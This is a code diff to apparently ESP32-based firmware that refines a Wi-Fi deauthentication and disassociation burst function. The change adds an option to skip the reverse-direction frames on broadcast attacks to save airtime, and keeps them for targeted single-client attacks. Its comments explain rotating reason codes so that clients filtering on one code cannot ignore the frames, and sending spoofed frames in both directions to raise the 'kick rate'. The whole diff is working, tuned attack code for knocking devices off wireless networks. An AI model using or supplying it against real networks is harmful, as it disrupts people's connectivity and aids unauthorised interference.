@@ -144,13 +144,19 @@ static inline void _deauth_build(uint8_t *frame,
 }
 
 /*
- * Fire a full deauth+disassoc burst at `dst` via `bssid`. Four frames
- * total per call: AP→STA pair + STA→AP reverse pair. `seq` is the
- * caller-owned counter, incremented once per frame.
+ * Fire a deauth+disassoc burst at `dst` via `bssid`. With
+ * `include_reverse=true` (default) sends 4 frames (AP→STA pair + STA→AP
+ * pair). With `include_reverse=false` sends 2 frames (AP→STA pair only)
+ * — halves airtime, used by broadcast deauth where clients are already
+ * covered by AP→STA. Targeted single-client deauth keeps both
+ * directions (some implementations only honour matching-direction
+ * frames). POS-AUDIT-031. `seq` is the caller-owned counter,
+ * incremented once per frame built.
  */
 static inline int wifi_deauth_pair(const uint8_t dst[6],
                                    const uint8_t bssid[6],
-                                   uint16_t *seq)
+                                   uint16_t *seq,
+                                   bool include_reverse = true)
 {
     /* Rotate reason codes — clients that filter on a single fixed reason
      * can't just drop us. Rotates every call. */
@@ -168,9 +174,12 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
 
     /* STA → AP (reverse): dest=AP, src=client, bssid=AP.
      * Some client drivers honor deauth-from-us-as-STA that they ignore
-     * from the AP direction. Symmetric pair doubles kick rate. */
-    _deauth_build(sta_to_ap_deauth, bssid, dst, bssid, reason, false, (*seq)++);
-    _deauth_build(sta_to_ap_dis,    bssid, dst, bssid, reason, true,  (*seq)++);
+     * from the AP direction. Symmetric pair doubles kick rate for
+     * targeted attacks. Skipped on broadcast paths to halve airtime. */
+    if (include_reverse) {
+        _deauth_build(sta_to_ap_deauth, bssid, dst, bssid, reason, false, (*seq)++);
+        _deauth_build(sta_to_ap_dis,    bssid, dst, bssid, reason, true,  (*seq)++);
+    }
 
     int ok = 0;
     esp_err_t r;
@@ -191,10 +200,16 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
     r = esp_wifi_80211_tx(WIFI_IF_STA, ap_to_sta_deauth, 26, false); if (r == ESP_OK) ok++;
     vTaskDelay(pdMS_TO_TICKS(2));
     r = esp_wifi_80211_tx(WIFI_IF_STA, ap_to_sta_dis, 26, false); if (r == ESP_OK) ok++;
-    vTaskDelay(pdMS_TO_TICKS(2));
-    r = esp_wifi_80211_tx(WIFI_IF_STA, sta_to_ap_deauth, 26, false); if (r == ESP_OK) ok++;
-    vTaskDelay(pdMS_TO_TICKS(2));
-    r = esp_wifi_80211_tx(WIFI_IF_STA, sta_to_ap_dis, 26, false); if (r == ESP_OK) ok++;
+    /* POS-AUDIT-031: STA->AP reverse direction adds 4 ms airtime for
+     * broadcast deauth where the client is already covered by AP->STA.
+     * Targeted deauth keeps both directions (some implementations only
+     * honour the matching-direction frame). */
+    if (include_reverse) {
+        vTaskDelay(pdMS_TO_TICKS(2));
+        r = esp_wifi_80211_tx(WIFI_IF_STA, sta_to_ap_deauth, 26, false); if (r == ESP_OK) ok++;
+        vTaskDelay(pdMS_TO_TICKS(2));
+        r = esp_wifi_80211_tx(WIFI_IF_STA, sta_to_ap_dis, 26, false); if (r == ESP_OK) ok++;
+    }
 
     /* Expose the last rc so feature UIs can display it on-screen
      * instead of requiring the user to attach a serial monitor.
